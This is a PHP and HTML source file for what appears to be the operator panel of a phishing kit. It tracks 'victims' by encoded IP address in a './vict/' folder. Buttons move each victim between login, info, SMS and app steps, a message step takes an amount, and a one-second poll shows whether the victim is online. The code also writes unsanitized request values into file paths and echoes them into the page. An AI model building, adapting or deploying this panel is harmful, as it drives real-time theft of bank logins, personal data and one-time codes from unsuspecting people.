<?php
    if(isset($_GET['step'])){
        if($_GET['step'] === 'message'){
            file_put_contents("./vict/".$_GET['id'].'.json', json_encode([
                'step' => $_GET['step'],
                'ammount' => $_POST['ammount']
            ]));
        }else{
            file_put_contents("./vict/".$_GET['id'].'.json', json_encode([
                'step' => $_GET['step']
            ]));
        }
    }

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pannel</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body>
    <div class="container ">
        <div class="flex flex-col gap-4 px-3">
            <div class="px-2">Ip: <?= base64_decode($_GET['id']) ?></div>
            <div class="px-2">Status: <span id="status"></span></div>
            <div class="px-2">Step: <span id="step"></span></div>
            <form action="./panel.php?step=login&id=<?= $_GET['id'] ?>" method="post">
                <button type="submit" class="min-w-[200px] rounded-md bg-slate-800 py-2  border border-transparent text-center text-sm text-white transition-all shadow-md hover:shadow-lg focus:bg-slate-700 focus:shadow-none active:bg-slate-700 hover:bg-slate-700 active:shadow-none disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none ml-2" type="button">
                    Login
                </button>
            </form>
            <form action="./panel.php?step=info&id=<?= $_GET['id'] ?>" method="post">
                <button type="submit" class="min-w-[200px] rounded-md bg-slate-800 py-2 border border-transparent text-center text-sm text-white transition-all shadow-md hover:shadow-lg focus:bg-slate-700 focus:shadow-none active:bg-slate-700 hover:bg-slate-700 active:shadow-none disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none ml-2" type="button">
                    Info
                </button>
            </form>
            <form action="./panel.php?step=sms&id=<?= $_GET['id'] ?>" method="post">
                <button type="submit" class="min-w-[200px] rounded-md bg-slate-800 py-2 border border-transparent text-center text-sm text-white transition-all shadow-md hover:shadow-lg focus:bg-slate-700 focus:shadow-none active:bg-slate-700 hover:bg-slate-700 active:shadow-none disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none ml-2" type="button">
                    sms
                </button>
            </form>
            <form action="./panel.php?step=app&id=<?= $_GET['id'] ?>" method="post">
                <button type="submit" class="min-w-[200px] rounded-md bg-slate-800 py-2 border border-transparent text-center text-sm text-white transition-all shadow-md hover:shadow-lg focus:bg-slate-700 focus:shadow-none active:bg-slate-700 hover:bg-slate-700 active:shadow-none disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none ml-2" type="button">
                    APP
                </button>
            </form>
            <form action="./panel.php?step=message&id=<?= $_GET['id'] ?>" method="post">
                <div class="flex items-center gap-4 px-2">
                    <div class="w-full max-w-sm min-w-[200px]">
                        <input name="ammount" class="w-full bg-transparent placeholder:text-slate-400 text-slate-700 text-sm border border-slate-200 rounded-md px-3 py-2 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-300 shadow-sm focus:shadow" placeholder="Type here...">
                    </div>
                    <button type="submit" class="rounded-md bg-slate-800 py-2 border border-transparent text-center text-sm text-white transition-all shadow-md hover:shadow-lg focus:bg-slate-700 focus:shadow-none active:bg-slate-700 hover:bg-slate-700 active:shadow-none disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none ml-2 w-[200px]" type="button">
                        Message
                    </button>
                </div>
            </form>

        </div>
    </div>
    <script>
        setInterval(async ()=>{
            const stepReq = await fetch('./step.php?id=<?= $_GET['id'] ?>');
            const stepData = await stepReq.json();
            document.querySelector('#step').innerHTML = stepData.step
            const onlineReq = await fetch('./online.php?id=<?= $_GET['id'] ?>');
            const onlineData = await onlineReq.json();
            const now = (new Date()).getTime();
            document.querySelector('#status').innerHTML = now - stepData > 2 ? 'Offline' : 'Online'
        }, 1000)
    </script>
</body>

</html>